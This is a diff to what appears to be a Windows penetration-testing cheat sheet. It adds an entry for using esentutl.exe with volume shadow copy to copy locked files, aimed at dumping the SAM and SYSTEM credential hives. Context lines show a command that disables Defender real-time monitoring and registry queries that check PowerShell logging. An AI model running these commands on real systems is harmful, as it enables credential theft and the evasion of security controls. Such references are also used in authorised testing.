@@ -1448,9 +1448,19 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 
 
 
+#### [](#header-4) Esenutl.exe Dump Locked File
+
+```powershell
+C:\WINDOWS\system32\esentutl.exe /y <SOURCE> /vss /d <DEST>
+
+
+Can be useful where you want to dump SAM and (or) SYSTEM but the file is locked by the OS (Windows 10)
+```
+
+
 #### [](#header-4) Check if Powershell Logging is Enabled
 
-```
+```powershell
 reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
 ```
